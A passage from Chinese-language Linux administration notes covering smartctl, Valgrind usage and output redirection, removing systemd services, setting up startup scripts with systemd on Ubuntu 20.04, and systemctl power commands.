5. smartctl命令：用于获取硬盘的SMART（自监测、分析和报告技术）信息。
   ```
   sudo smartctl -a /dev/sda
   ```
   该命令将显示指定磁盘的SMART属性和状态信息。

这些命令可以帮助您获取有关磁盘空间、分区、挂载点和硬盘状态的信息。根据您的具体需求，选择适当的命令来获取所需的磁盘信息。

---
## valgrind 使用技巧

当使用 Valgrind 进行代码分析时，以下是一些常用的技巧和建议：

1. 针对特定问题使用适当的 Valgrind 工具：Valgrind 工具集包含多个工具，如 Memcheck、Cachegrind、Massif 等，每个工具都有不同的功能和用途。根据你要解决的具体问题，选择适合的工具进行分析。

2. 使用合适的选项和参数：Valgrind 提供了多种选项和参数来控制分析的行为。根据你的需求，设置合适的选项，如内存泄漏检查、调试服务器、堆栈跟踪等。阅读 Valgrind 的文档以了解可用选项和参数，并根据实际情况进行设置。

3. 关注 Valgrind 的警告和报告：Valgrind 会生成警告和报告，指示可能存在的内存错误、泄漏、未初始化变量等问题。仔细阅读和理解这些报告，并根据提示进行代码的修复和优化。

4. 使用 Valgrind 工具的辅助工具：Valgrind 提供了一些辅助工具，如 `ms_print`（用于分析 Massif 输出）、`callgrind_annotate`（用于分析 Callgrind 输出）等。使用这些工具可以更好地可视化和分析 Valgrind 的结果。

5. 分析程序的热点代码：通过查看 Valgrind 的报告和分析结果，识别程序中的热点代码，即执行次数多、内存占用高或性能消耗大的代码段。针对这些热点代码进行优化，可以显著改善程序的性能和资源使用情况。

6. 结合调试器使用：Valgrind 和调试器（如 GDB）可以一起使用，以深入分析程序的问题。你可以在 Valgrind 报告中找到有关内存错误和泄漏的信息，然后使用调试器定位具体的代码位置并进行调试。

7. 针对大型程序进行分析：对于大型程序，Valgrind 的分析可能会耗费较长时间和大量内存。在这种情况下，可以使用 Valgrind 的部分功能，如 `--tool=memcheck --leak-check=no`，只对内存错误进行检查，以加快分析速度。

8. 测试不同的输入数据和场景：Valgrind 的分析结果可能会受到不同的输入数据和场景的影响。尝试使用不同的测试数据和场景来验证程序的内存安全性和性能，以充分覆盖各种情况。

最重要的是，要仔细阅读 Valgrind 的文档，理解各个工具的原理和用法，并根据

实际情况灵活应用。同时，要结合其他调试和性能分析工具，以获取更全面的代码分析和优化结果。

## valgrind 结果输出到文件

要将 Valgrind 的结果输出到文件中，可以使用重定向操作符（`>`）将 Valgrind 的输出重定向到一个文件。下面是一个示例：

```
valgrind --tool=memcheck ./my_program > valgrind_output.txt
```

在上述示例中，`valgrind_output.txt` 是要保存 Valgrind 输出的文件名。运行命令后，Valgrind 的输出将会写入该文件中，而不会显示在终端上。

如果你想要将标准错误（stderr）也输出到文件中，可以使用 `2>&1` 重定向标准错误到标准输出，然后再重定向到文件中。示例如下：

```
valgrind --tool=memcheck ./my_program > valgrind_output.txt 2>&1
```

在这个示例中，`2>&1` 将标准错误重定向到标准输出，然后将标准输出和标准错误都重定向到 `valgrind_output.txt` 文件中。

通过将 Valgrind 输出到文件中，你可以随时打开文件来查看和分析 Valgrind 的结果，以便更好地理解和解决程序中的内存错误和问题。

## Linux systemctl 删除服务

要从 Systemd 中删除服务条目（service），可以按照以下步骤进行操作：

1. 停止服务：
在删除服务之前，首先需要停止该服务。使用以下命令停止服务：

```bash
sudo systemctl stop servicename
```

请将 `servicename` 替换为你要删除的服务的名称。

2. 禁用服务：
使用以下命令禁用服务，以确保在系统启动时不会自动启动该服务：

```bash
sudo systemctl disable servicename
```

3. 删除服务文件：
服务文件通常位于 `/etc/systemd/system/` 或 `/usr/lib/systemd/system/` 目录中，具体取决于你的 Linux 发行版和配置。使用以下命令删除服务文件：

```bash
sudo rm /etc/systemd/system/servicename.service
```

请确保将 `servicename.service` 替换为你要删除的服务文件的实际名称。

4. 重新加载 Systemd 配置：
删除服务文件后，需要重新加载 Systemd 配置，以确保系统知道该服务已被删除。使用以下命令重新加载配置：

```bash
sudo systemctl daemon-reload
```

完成上述步骤后，服务条目就会从 Systemd 中彻底删除。

请注意，在执行这些操作时要谨慎，确保你要删除的是正确的服务条目，并备份相关文件以防需要恢复。

---

## Linux 自启动脚本 详解

在 Linux 系统中，可以使用不同的方法设置自启动脚本，具体取决于你所使用的 Linux 发行版和 init 系统。

在大多数现代 Linux 发行版中，常见的 init 系统是 Systemd。下面是使用 Systemd 设置自启动脚本的步骤：

1. 编写启动脚本：
在 Linux 系统上创建你的自启动脚本。脚本可以是 Bash 脚本或其他可执行脚本。确保脚本具有可执行权限。

```bash
#!/bin/bash

# 你的启动脚本命令
echo "System is starting. Do something here..."
```

2. 将脚本放置到适当的位置：
将脚本复制到一个适当的位置，以便系统可以找到它。通常，可以将自启动脚本放置在 `/etc/init.d/` 或 `/etc/systemd/system/` 目录中。

```bash
sudo cp my_startup.sh /etc/systemd/system/
```

3. 创建 Systemd 服务单元文件：
在 Systemd 的服务单元目录中创建一个文件，并添加以下内容：

```ini
[Unit]
Description=My Startup Script

[Service]
ExecStart=/path/to/my_startup.sh

[Install]
WantedBy=multi-user.target
```

在上面的配置中：
- `Description`：描述此服务的信息。
- `ExecStart`：指定要执行的启动脚本的路径。

4. 重新加载 Systemd：
在创建或修改 Systemd 服务单元文件后，需要重新加载 Systemd 配置。

```bash
sudo systemctl daemon-reload
```

5. 启用服务：
将刚刚创建的服务设置为自启动。

```bash
sudo systemctl enable my_startup.service
```

现在，你的启动脚本 `my_startup.sh` 将在系统启动时自动执行。可以通过重启系统来测试自启动脚本是否正常工作。

请注意，不同的 Linux 发行版和 init 系统可能有所不同。如果你使用的是其他 init 系统（如 SysV init），则需要使用不同的方法来设置自启动脚本。建议查阅所使用 Linux 发行版的文档以获取更详细的指导。

---

## ubuntu20 自启动脚本

在 Ubuntu 20.04 中，你可以使用 Systemd 来设置自启动脚本。Systemd 是一个系统和服务管理器，可以用于配置和管理系统上运行的服务、进程和自启动脚本。

以下是在 Ubuntu 20.04 中设置自启动脚本的步骤：

1. 编写启动脚本：
在 Ubuntu 20.04 上创建你的自启动脚本。比如，你可以在 `/usr/local/bin/` 目录下创建一个名为 `my_startup.sh` 的脚本。

```bash
#!/bin/bash

# 你的启动脚本命令
echo "System is starting. Do something here..."
```

2. 设置脚本权限：
确保脚本具有可执行权限。

```bash
chmod +x /usr/local/bin/my_startup.sh
```

3. 创建 Systemd 服务单元文件：
在 `/etc/systemd/system/` 目录下，创建一个名为 `my_startup.service` 的文件，并添加以下内容：

```ini
[Unit]
Description=My Startup Script

[Service]
Type=simple
ExecStart=/usr/local/bin/my_startup.sh

[Install]
WantedBy=multi-user.target
```

在上面的配置中：
- `Description`：描述此服务的信息。
- `ExecStart`：指定要执行的启动脚本的路径。

4. 重新加载 Systemd：
在创建或修改 Systemd 服务单元文件后，需要重新加载 Systemd 配置。

```bash
sudo systemctl daemon-reload
```

5. 启用服务：
将刚刚创建的服务设置为自启动。

```bash
sudo systemctl enable my_startup.service
```

现在，你的启动脚本 `my_startup.sh` 将在系统启动时自动执行。可以通过重启系统来测试自启动脚本是否正常工作。

请确保在编写脚本和配置 Systemd 服务单元文件时，路径和权限设置都是正确的。这样就能够确保你的自启动脚本在系统启动时可靠地执行。

---

## 重启系统

在 `systemd` 下，可以使用 `systemctl` 命令来执行与重启系统相关的操作。以下是一些常用的 `systemctl` 命令及其说明：

1. `reboot`：用于重启系统。执行此命令会向系统发送重启信号，导致系统重新启动。
   ```
   sudo systemctl reboot
   ```

2. `poweroff`：用于关闭系统。执行此命令会向系统发送关闭信号，导致系统完全关闭。
   ```
   sudo systemctl poweroff
   ```

3. `halt`：用于停止系统。执行此命令会向系统发送停止信号，导致系统停止运行。
   ```
   sudo systemctl halt
   ```

4. `suspend`：用于挂起系统。执行此命令会将系统置于挂起状态，节省电源但保留系统状态。
   ```
   sudo systemctl suspend
   ```

5. `hibernate`：用于休眠系统。执行此命令会将系统置于休眠状态，将内存中的内容保存到磁盘，以便稍后恢复。
   ```
   sudo systemctl hibernate
   ```

需要注意的是，执行上述命令通常需要超级用户权限（使用 `sudo` 或以 `root` 用户身份运行）。

此外，还可以使用 `shutdown` 命令来执行系统重启操作，该命令提供了更多选项和参数以灵活控制系统的行为。